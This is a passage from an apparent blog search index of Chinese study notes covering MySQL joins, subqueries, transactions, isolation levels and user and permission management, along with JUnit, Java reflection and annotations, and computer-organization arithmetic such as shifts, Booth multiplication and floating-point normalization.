A,B，取这两个集合的所有组成情况\n要完成多表查询，需要消除无用的数据\n多表查询分类\n\n内连接查询\n外连接查询\n子查询\n\n\n\n# 12.1 多表查询 - 内连接\n\n内连接查询两张表中同时存在的数据，如果某一表的条件语句的字段为空，则这个结果不在结果表中显示\n\n\n隐式内连接：使用 where 条件来消除无用的数据\n\n-- 查询所有员工信息和对应部门信息,一般查询的时候会查询部分字段，不会将所有字段都查出来\nSELECT * FROM emp,dept WHERE emp.dept_id = dept.id;\n-- 查询员工表的名称，性别，部门表的名称\nSELECT emp.name,emp.gende,dept.name FROM emp,dept WHERE emp.dept_id = dept.id;\n-- 查询员工表的名称，性别，部门表的名称，使用表的别名\nSELECT t1.name,t1.gende,t2.`name` FROM emp t1,dept t2 where t1.dept_id = t2.id;\n\n显式内连接：\n\n语法：select 字段列表 from 表名 1 inner join 表名 2 on 条件；\n\n\n\nSELECT * FROM emp INNER JOIN dept ON emp.dept_id = dept.id;\nSELECT * FROM emp JOIN dept ON emp.dept_id = dept.id;\n\n\n内连接查询注意事项：\n\n从哪些表中查询数据\n查询条件是什么\n查询哪些字段\n\n\n\n# 12.2 多表查询 - 外连接\n\n左外连接\n\n语法：select 字段列表 from 表 1 left [outer] join 表 2 on 条件；\n查询的是左表的所有数据以及两表的交集部分\n\n\n\nSELECT t1.*,t2.`name` FROM emp t1 LEFT JOIN dept t2 ON t1.dept_id = t2.id;\n\n\n右外连接\n\n语法：select 字段列表 from 表 1 right [outer] join 表 2 on 条件；\n查询的是右表的所有数据以及两表的交集部分\n\n\n\nSELECT t1.*,t2.`name` FROM emp t1 RIGHT JOIN dept t2 ON t1.dept_id = t2.id;\n\n# 12.3 多表查询 - 子查询\n\n概念：查询中嵌套查询，称嵌套的查询为子查询\n基本演示\n\n-- 查询工资最高的员工信息\n-- 1.查询最高的工资是多少 9000\nSELECT MAX(salary) FROM emp;\n-- 2.查询员工信息，并且工资等于9000的\nSELECT * FROM emp WHERE salary = 9000;\n-- 一条SQL完成查询，子查询\nSELECT * FROM emp WHERE emp.salary = (SELECT MAX(salary) FROM emp);\n\n\n子查询的不同情况\n\n子查询的结果是单行单列的\n\n子查询可以作为条件，使用运算符去判断。运算符：&gt; &lt; &gt;= &lt;= &lt;&gt; =\n查询工资小于平均工资的人\nSELECT * FROM emp WHERE salary &lt; (SELECT AVG(salary) FROM emp);\n\n\n子查询的结果是多行单列的\n\n子查询可以作为条件，使用运算符 IN 来判断\n\n\n\n-- 查询`财务部`和`市场部`所有员工的信息\nSELECT id FROM dept WHERE `NAME` = \"财务部\" OR `NAME` = \"市场部\";\nSELECT * FROM emp WHERE dept_id = 3 OR dept_id = 2;\nSELECT * FROM emp WHERE dept_id IN (2,3);\n\nSELECT * FROM emp WHERE dept_id IN (SELECT id FROM dept WHERE `NAME` = \"财务部\" OR `NAME` = \"市场部\");\n\n子查询的结果是多行多列的\n\n子查询可以作为一张虚拟表来进行表的查询\n\n\n\nSELECT * FROM dept t1, (SELECT * FROM emp WHERE emp.join_date > '2011-11-11') t2 WHERE t1.id = t2.dept_id;\n-- 使用普通内连接查询\nSELECT * FROM emp t1, dept t2 WHERE t1.dept_id = t2.id AND t1.join_date > '2011-11-11';\n\n\n\n# 13、事务\n\n事务的基本介绍\n事务的四大特征 **（常见面试题）**\n事务的隔离级别（了解）\n\n# 13.1 事务的基本介绍\n\n概念：如果一个包含多个步骤的业务操作，被事务管理，那么这些操作要么同时成功，要么同时失败\n\n\n\n\n操作：\n\n开启事务：start transaction\n回滚：rollback\n提交：commit\n\n\n\nMySQL 数据库中事务默认自动提交，Oracle 数据库默认是手动提交事务\n\n事务提交的两种方式：\n\n自动提交：\n\nmysql 就是自动提交的\n一条 DML（增删改）语句会自动提交一次事务\n\n\n手动提交：\n\n需要先开启事务，再提交\n\n\n\n\n修改事务的默认提交方式\n\n\n\n-- 查看事务的默认提交方式\nselect @@autocommmit; #结果为1表示自动提交，结果为0表示手动提交\n-- 修改默认提交方式\nset @@autocommit = 0;\n#这时候写了DML语句，不手动提交是不会生效的\n# 13.2 事务的四大特征 ***\n\n原子性：是不可分割的最小操作单位，要么同时成功，要么同时失败\n持久型：当事务提交或回滚后，数据库会持久化地保存数据\n隔离性：多个事务之间相互独立\n一致性：事务操作前后数据总量不变\n\n# 13.3 事务的隔离级别\n\n\n概念：多个事务之间是隔离的，相互独立的，但是如果多个事务操作同一批数据，则会引发问题，设置不同的隔离级别就可以解决这些问题。\n\n\n存在的问题：\n\n脏读：一个事务，读取到另一个事务中没有提交的数据\n不可重复度（虚读）：在同一个事务中两次读取到的数据不一样\n幻读：一个事务操作（DML）数据表中所有的记录，另一个事务添加了一条数据，则第一个事务查询不到自己的修改\n\n\n\n隔离级别：\n\nread uncommitted：读未提交\n\n会产生的问题：脏读、不可重复度、幻读\n\n\nread committed：读已提交（Oracle 默认隔离级别）\n\n会产生的问题：不可重复度、幻读\n\n\nrepeatable read：可重复度（MySQL 中默认隔离级别）\n\n会产生的问题：幻读\n\n\nserializable：串行化\n\n可以解决所有的问题\n\n\n\n\n\n注意：隔离级别从小到大，安全性越来越高，但是效率越来越低\n\n\n数据隔离级别查询和设置\n\n\n-- 查询隔离级别：\nselect @@tx_isolation;\n-- 设置隔离级别：\nset global transaction isolation level 级别字符串; #字符串就是上面的4个\n# 14、DCL：管理用户，授权\n\nDBA：数据库管理员\n\n管理用户\n授权\n\n\n\n# 14.1 用户管理\n\n添加用户\n删除用户\n修改用户密码\n\nMySQL 中忘记 root 密码\n\n以 CMD 执行 net stop mysql 停止 mysql 服务（管理员权限）\n使用无验证方式启动 MySQL 服务：mysqld --skip-grant-tables\n打开新的 cmd 窗口，直接输入 mysql 命令回车就可以登录成功\nuse mysql;\nupdate user set password = password (‘新密码’) where user = ‘root’;\n关闭这两个窗口\n打开任务管理器，手动结束 mysqld.exe 进程\n使用新密码登录\n\n\n\n\n查询用户\n\n通配符 %：表示可以在任意主机使用用户登录数据库\n\n\n\n-- 切换到mysql数据库\nUSE mysql;\n-- 查询user表\nSELECT * FROM USER;\n\n-- 创建用户\ncreate user '用户名'@'主机名' identified by '密码';\nCREATE USER 'zhangsan'@'localhost' IDENTIFIED BY '123';\n\n-- 删除用户\nDROP USER '用户名'@'主机名';\nDROP USER 'zhangsan'@'localhost';\n\n-- 修改用户密码\nUPDATE USER SET PASSWORD = PASSWORD('新密码') WHERE user = '用户名';\nSET PASSWORD FOR '用户名'@'主机名' = PASSWORD('新密码');\n# 14.2 权限管理\n\n查询权限\n授予权限\n撤销权限\n\n-- 查询权限\nSHOW GRANTS FOR '用户名'@'主机名';\nSHOW GRANTS FOR 'zhangsan'@'localhost';\n\n-- 授予权限\nGRANT 权限列表 ON 数据库名.表名 TO '用户名'@'主机名';\nGRANT SELECT ON db3.dept TO 'zhangsan'@'localhost';\nGRANT ALL ON *.* TO 'zhangsan'@'localhost';#将所有表的所有权限授予zhangsan\n\n-- 撤销权限\nREVOKE 权限列表 ON 数据库名.表名 FROM '用户名'@'主机名';\nREVOKE UPDATE ON DB3.ACCOUNT FROM 'LISI'@'%';\n","slug":"JavaWeb-数据库","date":"2022-06-20T15:09:13.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"7ee1f34768cc2e04e0232a752344cda0","title":"junit、反射","content":"# 1、junit 单元测试\n# 1.1 测试分类：\n\n黑盒测试：不用具体关注里面的代码内容，只要输入 input，经过代码的执行查看 output 是否达到预期，不需要写测试代码\n白盒测试：也需要 input 和 output，但是输入了之后代码的执行，代码的逻辑、算法、严谨度、效率等都要关注，需要写测试代码\n\njunit 就是白盒测试的一种\n# 1.2 junit 的使用\n\n\n步骤\n\n定义一个测试类（测试用例）\n\n建议：\n\n测试类名：被测试类名 Test，如 CalculatorTest\n包名：xxx.xxx.xx.test，如 cn.itclass.test\n\n\n\n\n定义测试方法：可以独立运行\n\n建议：\n\n方法名：test 测试方法名，如 testAdd ()\n返回值：void\n参数列表：空参\n\n\n\n\n给这个方法加 @Test\n导入 Junit 依赖环境（点击红灯泡，添加 junit 到 classpath）—— 视频课包为 org.junit.Test，自己补全的为 org.testng.annotations.Test; ，但是能用\n\n运行成功后会显示绿色 Test passed\n使用 junit 的时候看的不是输出的结果，看的是红色还是绿色，红色表示失败，绿色表示成功\n\n\n\n\n\n判定结果\n\n红色：失败\n绿色：成功\n可以使用 Assert 对结果进行判定，如果判定结果成功就是绿色，结果与断言结果不一样是红色\n\nAssert：静态类，使用 Assert.assertEquals (期望值，真实值)\n判定结果的时候一般不进行输出\n\n\n\n\n\n可以在一个 junit 类里面定义多个方法，然后点击对应方法的绿色小箭头单独运行\n\n\npackage cn.itclass.test;\n\nimport cn.itclass.junit.caculater;\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.testng.Assert;\n\n\n\npublic class CalculatorTest &#123;\n    @Before\n    public void init() &#123;\n            System.out.println(\"before\");\n    &#125;\n    /**\n     * 测试add方法\n     */\n    @Test\n    public void testAdd()&#123;\n        System.out.println(\"我被执行了\");\n        //1.创建计算器对象\n        caculater a = new caculater();\n        int sum = a.add(1, 2);\n        //2.调用add方法\n        System.out.println(sum);\n        //3.断言：我断言的结果是3，如果是一样的就是\n        Assert.assertEquals(3,sum);\n    &#125;\n\n    @After\n    public void finish() &#123;\n        System.out.println(\"结束了\");\n    &#125;\n&#125;\n\n补充\n\n@Before：\n\n修饰的方法会在测试方法之前被自动执行\n\n\n@After：\n\n修饰的方法会在测试方法执行之后被自动执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n注：导包的时候一定要使用 org.junit ，如果导入的是 org.testng.annotations.Test，Test 可以正常使用，Before 和 After 不能\n# 2、反射：框架设计的灵魂\n\n\n框架：半成品软件。可以在框架的基础上进行软件的开发，简化编码\n\n\n反射：将类的各个组成部分封装为其他对象，这个过程称为反射机制\n\n\njava 代码在计算机中运行的三个阶段：\n\n\nSource 源代码阶段：写完一个类之后，使用 javac 进行编译，编译后成为一个 class 字节码文件，里面分三个区域，一个存档成员变量，一个存放构造方法，一个存放成员方法\n\n\nClass 类对象阶段：类加载器 ClassLoader 将字节码文件加载到内存中，内存中会有一个 Class 类对象来描述字节码文件，这个对象中有成员变量、构造方法、成员方法，成员变量封装成 Field 对象，构造方法封装为 Constructor 对象，成员方法封装为 Method 对象，这三个对象在 Class 类对象里面组成 Class 类，由于变量可能有多个，于是使用一个数组来描述成员内容如下\n\nField [] fields\nConstructor[] cons\nMethod[] methods\n\n这些组成一个类对象，之后可以使用这些类对象进行实例化等\n\n\nRuntime 运行阶段：Person 对象 new Person ();\n\n\n\n\n好处：\n\n可以在程序运行过程中去操作这些对象。\n可以解耦，提高程序的可扩展性\n\n\n\n\n# 2.1 获取 Class 类对象的方式\n\nClass.forName (“全类名”)：是将字节码文件加载进内存，返回 Class 对象\n\n多用于配置文件，将类名可以定义在配置文件中。读取文件，加载类\n\n\n类名.class：通过类名的属性 class 来获取\n\n多用于参数的传递\n\n\n对象.getClass ()：getClass () 方法在 Object 类中定义着\n\n多用于对象的获取字节码的方式，有对象了想获取字节码文件对象\n\n\n\n\n结论：同一个字节码文件 (*.class) 在一次程序的运行过程中，只会被加载一次，不论通过哪一种方式获取的 Class 对象都是同一个\n\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport cn.itclass.domain.Student;\n\npublic class ReflectDemo1 &#123;\n\n    public static void main(String[] args) throws Exception &#123;\n        //1.Class.forName(\"全类名\")\n        Class cls1 = Class.forName(\"cn.itclass.domain.Person\");\n        System.out.println(cls1);\n        //2.类名.class\n        Class cls2 = Person.class;\n        System.out.println(cls2);\n        //3.对象.getClass()\n        Person p = new Person();\n        Class cls3 = p.getClass();\n        System.out.println(cls3);\n\n        //==比较这三个对象\n        System.out.println(cls1 == cls2); //true\n        System.out.println(cls1 == cls3); //true\n\n        Class cls4 = Student.class;\n        System.out.println(cls1 == cls4); //false\n    &#125;\n&#125;\n# 2.2 Class 对象功能\n\n获取功能：\n\n获取成员变量们\n\nField [] getFields ()：获取所有 public 修饰的成员变量\nField getField (String name)：获取指定名称的 public 修饰的成员变量\nField [] getDeclaredFields ()：获取所有成员变量，不考虑访问修饰符\nField getDeclaredField (String name)：获取指定名称的成员变量，不考虑访问修饰符\n\n\n获取构造方法们\n\nConstructer&lt;?&gt;[] getConstructors ()：获取所有 public 修饰的构造方法\nConstructer&lt;T&gt; getConstructor (类 &lt;?&gt;… parameterTypes)：获取指定 public 修饰构造方法，这里要的参数是构造参数对象\nConstructer&lt;?&gt;[] getDeclaredConstructors ()：获取所有构造方法，不考虑访问修饰符\nConstructer&lt;T&gt; getDeclaredConstructor (类 &lt;?&gt;… parameterTypes)：获取指定构造方法，不考虑访问修饰符\n\n\n获取成员方法们\n\nMethod [] getMethods ()：获取所有 public 修饰的方法\nMethod getMethod ()：获取指定 public 方法，参数为方法名和参数列表\nMethod [] getDeclaredMethods ()：获取所有方法，不考虑访问修饰符\nMethod getDeclaredMethod ()：获取指定方法，不考虑访问修饰符，参数为方法名和参数列表\n\n\n获取类名\n\nString getName()\n\n\n\n\nField：成员变量\n\n操作：\n\n设置值\n\nset (Object obj, Object value)：给 obj 对象设置 value 值\n\n\n获取值\n\nget (Object obj)：获取指定对象的值，比如 get§，获取的是 p 里的这个成员变量的值\n\n\n忽略访问权限修饰符的安全检查\n\nsetAccessible (true)：暴力反射，Field 对象中的方法\n\n\n\n\n\n\nConstructor：构造方法\n\n创建对象：T newInstance (Object … initargs)\n如果使用空参数构造方法创建对象，操作可以简化：Class 对象的 newInstance\n\n\nMethod：方法\n\n执行方法：invoke (Object obj, Object… args)，参数为对象和实际参数列表\n获取方法名称：\n\nString getName：获取方法名\n\n\n\n\n获取类名\n\nClass 对象.getName; 获取的是全类名\n\n\n\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport java.lang.reflect.Field;\n\n/*获取成员变量*/\npublic class ReflectDemo2 &#123;\n    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException &#123;\n        //0.获取person的class对象\n        Class&lt;Person> personClass = Person.class;\n        //1.Field[] getFields()\n        Field[] fields = personClass.getFields();\n        for (Field field:fields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //2.Field getField(String name)\n        Field a = personClass.getField(\"a\");\n        System.out.println(a);\n        //获取成员变量a的值\n        Person p = new Person();\n        Object value = a.get(p);\n        System.out.println(value);\n        a.set(p,\"张三\");\n        System.out.println(p);\n        System.out.println(\"===============================\");\n\n        //3.Field[] getDeclaredFields()\n        Field[] declaredFields = personClass.getDeclaredFields();\n        for(Field field : declaredFields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //4.Field getDeclaredField(String name)\n        Field d = personClass.getDeclaredField(\"d\");\n        //忽略访问权限修饰符的安全检查\n        d.setAccessible(true);//暴力反射\n        Object o = d.get(p);\n        System.out.println(o);\n    &#125;\n\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\n/*获取构造方法*/\npublic class ReflectDemo3 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;\n        //0.获取Person的Class对象\n        Class personClass = Person.class;\n        //1.Constructer&lt;?>[] getConstructors()\n        Constructor[] constructors = personClass.getConstructors();\n        //2.Constructer\\&lt;T\\> getConstructor(类&lt;?>... parameterTypes)\n        Constructor constructor = personClass.getConstructor(String.class, int.class);\n        System.out.println(constructor);\n        //创建对象\n        Object person = constructor.newInstance(\"张三\", 23);\n        System.out.println(person);\n        Constructor constructor1 = personClass.getConstructor();\n        Object person2 = constructor1.newInstance();\n        System.out.println(person2);\n        //空参构造（已过时）\n        Object o = personClass.newInstance();\n        System.out.println(o);\n\n    &#125;\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class ReflectDemo4 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;\n        Class&lt;Person> personClass = Person.class;\n        /**\n         获取成员方法们\n\n         1. 获取所有方法：Method[] getMethods()\n         2. 获取指定方法：Method getMethod()\n         3. Method[] getDeclaredMethods()\n         4. Method getDeclaredMethod()\n         */\n        //获取指定名称的方法\n        Method eat = personClass.getMethod(\"eat\");\n        Person p = new Person();\n        eat.invoke(p);\n\n        Method eat1 = personClass.getMethod(\"eat\", String.class);\n        eat1.invoke(p,\"hello\");\n\n        //获取所有方法\n        Method[] methods = personClass.getMethods();\n        for(Method m : methods) &#123;\n            System.out.println(m);\n            m.setAccessible(true);\n            String name = m.getName();\n            System.out.println(name);\n        &#125;\n\n        String name = personClass.getName();\n        System.out.println(name);\n    &#125;\n&#125;\n\n# 2.3 反射案例\n\n需求：写一个 &quot;框架&quot;，不能改变该类的任何代码的前提下，可以帮我们创建任意类的对象，并且可以执行任意类的方法\n\n实现：\n\n配置文件\n反射\n\n\n步骤：\n\n将需要创建的对象的全类名和需要执行的方法定义在配置文件中\n在程序中加载读取配置文件\n使用反射技术来加载类文件进内存\n创建对象\n执行方法\n\n\n\n\n\npackage cn.itclass.reflect;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\n/**\n * 假设的框架类\n */\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n//        Person p = new Person();\n//        p.eat();\n\n        //1.加载配置文件\n        //1.1创建Properties对象\n        Properties pro = new Properties();\n        //1.2加载配置文件，转换为一个集合\n        //1.2.1获取ckass目录下的配置文件\n        ClassLoader classLoader = ReflectTest.class.getClassLoader();\n        InputStream is = classLoader.getResourceAsStream(\"pro.properties\");\n        pro.load(is);\n\n        //2.获取配置文件中定义的数据\n        String className = pro.getProperty(\"className\");\n        String methodName = pro.getProperty(\"methodName\");\n\n        //3.加载该类进内存\n        Class&lt;?> cls = Class.forName(className);\n\n        //4.创建对象\n        Object o = cls.newInstance();\n\n        //5.获取方法对象\n        Method method = cls.getMethod(methodName);\n\n        //6.执行方法\n        method.invoke(o);\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n注：类加载器没学，回头补上\n# 3、注解\n\n概念：说明程序的，给计算机看的\n注释：用文字描述程序的。给程序员看的\n概念描述：\n\nJDK1.5 之后的新特性\n说明程序的\n使用注解：@注解名称\n\n\n作用分类：\n\n编写文档：通过代码里标识的注解生成文档【生成文档 doc 文档】\n代码分析：通过代码里标识的注解对代码进行分析【使用反射】—— 经常使用\n编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】\n\n\n\n# 3.1 JDK 中预定义的一些注解\n\n@Override：监测点被该注解标注的方法是否是继承自父类（接口）的\n@Depreciated：该注解标注的内容已过时，\n@SuppressWarnings：压制警告 ——@SuppressWarnings (“all”)，一般传 all，写在类上\n\n# 3.2 自定义注解\n\n\n格式：\n\n元注解\npublic @interface 注解名称 {属性列表}\n\n\n\n本质：注解本质上就是一个接口，该接口默认继承 Annotation 接口\n\npublic interface MyAnno extends java.lang.annotation.Annotation{}\n\n\n\njava 反编译命令：javap java.class 文件\n\n\n属性：接口中可以定义的一成员方法\n\n\n要求：\n\n\n属性的返回值类型有下列取值，其他不行\n\n\n基本数据类型（void 不行）\n\n\nString\n\n\n枚举\n\n\n注解\n\n\n以上类型的数组\n\n\n\n\n定义了属性，在使用时需要给属性赋值\n\n\n如果定义属性时，使用 default 关键字给属性默认初始化值，则使用注解时可以不进行属性的赋值\n\n\n如果只有一个属性需要赋值，并且属性的名称是 value，则 value 可以省略，直接定义值即可\n定义：String name () default “张三”;\t使用：@MyAnno (name = “李四”);\n\n\n数组赋值时值使用大括号包裹。如果数组中只有一个值，则大括号可以省略\n\n\n\n\n\n\n\n\n元注解：用于描述注解的注解\n\n@Target：描述注解能够作用的位置\n\nElementType 取值：\n\nTYPE: 可以作用于类上\nMETHOD: 可以作用于方法上\nFIELD: 可以作用于成员变量上\n\n\n\n\n@Retention：描述注解被保留的阶段\n\n@Retention (RetentionPolicy.RUNTIME)：当前被描述的注解会保留到 class 字节码文件中并被 JVM 读取到\n\n\n@Documented：描述注解是否被抽取到 API 文档中\n@Inherited：描述注解是否被类的子类继承\n\n\n\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.*;\n\n/**\n * 元注解：用于描述注解的注解\n     - @Target：描述注解能够作用的位置\n     - @Retention：描述注解被保留的阶段\n     - @Documented：描述注解是否被抽取到API文档中\n     - @Inherited：描述注解是否被子类继承\n */\n@Target(value = &#123;ElementType.TYPE,ElementType.METHOD&#125;)//表示该MyAnno3只能作用于类上\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\npublic @interface MyAnno3 &#123;\n&#125;\n# 3.3 在程序中使用（解析）注解：获取注解中定义的属性值\n\n获取注解定义的位置的对象\tClass/Method/Field 对象\n获取指定的注解\n\ngetAnnotation(Class)\n这行命令执行后其实就是在内存中生成了一个该注解接口的子类实现对象\n\n\n调用注解中的抽象方法来获取配置的属性值\n\npackage cn.itclass.annocation;\n\nimport java.io.IOException;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\n/**\n * 假设的框架类\n */\n@Pro(className = \"cn.itclass.annocation.Demo1\",methodName = \"show\")\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n        //1.解析注解\n        //1.1获取该类的字节码文件对象\n        Class&lt;ReflectTest> reflectTestClass = ReflectTest.class;\n        //2.获取上边的注释对象\n        //其实就是在内存中生成了一个该注解接口的子类实现对象\n        Pro annotation = reflectTestClass.getAnnotation(Pro.class);\n        //3.调用注解对象中定义的抽象方法，获取返回值\n        String className = annotation.className();\n        String methodName = annotation.methodName();\n        System.out.println(className);\n        System.out.println(methodName);\n\n        //下面与reflect一样\n        Class&lt;?> aClass = Class.forName(className);\n        Object o = aClass.newInstance();\n\n        Method method = aClass.getMethod(\"show\");\n        method.invoke(o);\n    &#125;\n&#125;\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * 描述需要去执行的类名，和方法名\n */\n@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Pro &#123;\n    String className();\n    String methodName();\n&#125;\n# 3.4 小结\n\n以后大多数时候会使用注解，而不是自定义注解\n注解给谁用？\n\n编译器\n给解析程序用\n\n\n注解不是程序的一部分，可以理解为注解就是一个标签\n\n","slug":"junit、注解、反射","date":"2022-06-19T12:28:37.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"460b9e3a35727b706e187bd7c49b4015","title":"计算机组成原理-数据的表示和运算-2","content":"# 移位运算\n\n# 算数移位\n\n\n移动小数点相当于改变每个位的位权\n移位：通过改变各个数码位和小数点的相对位置，从而改变各个数码位的位权。可以用移位运算实现乘法、除法\n\n# 原码的算数移位\n原码的算数移位：符号位保持不变，仅对数值位进行移位\n右移：高位补 0，低位舍弃，若舍弃的位等于 0，则相当于除以 2，若舍弃的位不等于 0，则会丢失精度\n\n左移：低位补 0，高位舍弃，若舍弃的位等于 0，则相当于 ×2，若舍弃的位不等于 0，则会出现严重误差\n\n原码表示的定点小数与定点整数一个效果\n# 反码的算数移位\n正数的反码移位：正数的反码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的反码移位\n\n反码尾数部分和原码是完全相反的，\n右移：高位补 1，低位舍弃\n左移：低位补 1，高位舍弃\n\n# 补码的算数移位\n正数的补码移位：正数的补码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的补码移位\n\n补码是从反码的基础上末位 + 1 得到的\n补码的规律为：从右往左到第一个 1 为止，后半部分与原码相同，前半部分和反码相同\n\n\n\n右移：高位补 1，低位舍弃\n左移：低位补 0，高位舍弃\n\n# 算数移位总结\n\n# 算数移位的应用举例\n\n\n# 循环移位\n在循环移位的时候整个二进制字符串是进行循环补位的\n\n循环左移\n带进位位的循环左移\n\n\n\n循环移位的操作很适合把一个数字的低字节和高字节进行调换\n# 知识点回顾\n\n# 定点数原码乘法运算\n\n手算乘法（十进制）\n\n手算乘法（二进制）\n\n考虑用及其实现：\n\n实际数字有正负，符号位如何处理？\n乘积的位数扩大一倍，如何处理？\n4 个位积都要保存下来最后统一相加？\n\n# 原码一位乘法\n符号位单独处理：符号位等于 x 的符号位异或 y 的符号位\n数值位取绝对值进行乘法计算\n\n\nMQ 存放乘数和积的低位\nX 里存放被乘数\nACC 存放乘积高位\n如果 MQ 的最低位为 1，ACC 就加上 X 中的值，如果 MQ 的最低位为 0，就不进行相加\n相加结束之后 ACC 和 MQ 整体右移一位，循环上述操作\n乘数的符号位不用参与运算\n小数点隐含在积的符号位的右边\n\n\n# 原码一位乘法（手算模拟）\n\n原码整数的乘法与小数的运算方法是一致的，注意一下小数点的位置即可\n# 定点数补码的乘法运算\n# 补码的一位乘法\n设机器字长为 5 位（含符号位，n=4），x=-0.1101, y=+0.1011，采用 Booth 算法求 x・y\n原码一位乘法\n\n进行 n 轮加法、移位\n每轮可能加 x 绝对值，可能加 0，具体要看 MQ 的最低位的值\n每次移位是 “逻辑右移”\n符号位不参与运算\n\n补码一位乘法\n\n进行 n 论加法、移位，最后再多来一次加法\n可能加 0，可能加 [x] 补，可能加 [-x] 补，根据当前 MQ 的最低位和辅助位来确定加什么\n\n辅助位 - MQ 中最低位 = 1 时，(ACC)+[X] 补\n辅助位 - MQ 中最低位 = 0 时，(ACC)+0\n辅助位 - MQ 中最低位 =-1 时，(ACC)+[-X] 补\n\n\n每次移位是 “补码的算数右移”—— 算数右移：符号位保持不动，数字右移\n符号位参与运算\n\n补码的一位乘法（手算模拟）\nMQ 需要多一位做辅助位，辅助位初始为 0，每次右移会使 MQ 的最低位顶替原本的辅助位，随之 ACC 和 X 都是双符号位\n\n# 定点数原码除法运算\n\n# 手算除法（十进制）\n\n手算除法（二进制）\n\n# 原码除法：恢复余数法\n符号位单独处理：被除数和除数的符号位异或\n数值拉取绝对值进行除法计算\n写出 x,y 的原码，y 的补码，[-y] 补\n\n\n每次上商的时候默认会商 1，然后会把 ACC 和通用寄存器的值相减后的结果再放回 ACC 中（(ACC)+[-y] 补），如果减法运算之后符号位为 1，说明此时余数小于除数，应该商 0 的，之后计算机再将上商的值改为 0，这时 ACC 的值已经放了之前的负数，要在返回原样，就要再加上除数 [y] 补，再次覆盖 ACC\n\n\n把 ACC 和 MQ 的内容全部左移一位，进行一个错位，重复上述步骤\n\n\n\n小数点默认在第一个 0 后面，余数 = 0.0111X2^{-n}，n=4\n# 原码除法：恢复余数法（手算）\n\n# 原码除法：加减交替法（不恢复余数法）\n\n\n思路：上商为 1 相减之后出现负数直接上商 0，然后逻辑左移，加 y 补\n# 定点数补码除法运算\n# 补码除法：加减交替法\n\n符号位直接参与运算，因此不用写绝对值的补码，直接写原数的补码\n采用双符号位\n被除数和除数同号，则被除数减去除数；异号则被除数加上除数\n余数和除数同号，商 1，余数左移一位减去除数\n余数和除数异号，商 0，余数左移一位加上除数\n重复 n 次\n\n\n末位商恒置为 1\n# 除法运算总结回顾\n\n# C 语言类型转换\nC 语言中的定点整数，如 int short long 都是用补码存储的\nunsigned 表示无符号整数\n\n# 数据的存储和排列\n# 大小端模式\n\n大端：将高有效字节放在低地址，适合人类阅读\n小端：将高有效字节放在高地址，适合机器处理\n# 边界对齐\n\n转换地址就逻辑左移右移即可，每次访存只能读取一个字，且不能跨行读取\n# 浮点数的表示\n\n定点数的局限性：当所需表示的数值较大时，定点数就不能正确表示\n定点数可表示的数字范围有限，但我们不能无限制地增加数据的长度\n科学计数法：+11+3.026\n\n尾数部分越短能表示的精度就越低，阶码表示对应进制的多少次方\n\n阶码反映数值的大小，尾数反映精度\n\n# 浮点数的表示\n\n\nr: 进制，E：阶码；M：尾数\n\n# 浮点数尾数的规格化\n尾数的最高位如果是 0 就没有意义，是无效值，会丧失精度\n左规：当浮点数运算的结果为非规格化时要进行规格化处理，将尾数算数左移一位，阶码减 1\n\n右规：当浮点数运算结果的尾数出现溢出（双符号位为 01 或 10,）时，将尾数算数右移一位，阶码加 1\n\n注：采用双符号位，当溢出发生时，可以挽救。更高的符号位是正确符号位\n# 规格化浮点数的特点\n\n\n# 浮点数标准 IEEE 754\n","slug":"计算机组成原理-数据的表示和运算-2","date":"2022-06-12T00:58:10.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"02e7efbd219a0c25e416f110675eb1a9","title":"计算机组成原理-数据的表示和运算","content":"# 无符号整数的表示和运算\n# 无符号整数的加法\n按位相加\n# 无符号整数的减法\n\n被减数不变，减数全部按位取反，末位 + 1，减法变加法\n从最低位开始，按位相加，并往更高位进位\n\n# 带符号整数的表示和运算 - 原反补\n# 补码的加法运算\n当负数参与加法运算时，要将两个数全部取补码，符号位也参与运算，不需要单独处理\n# 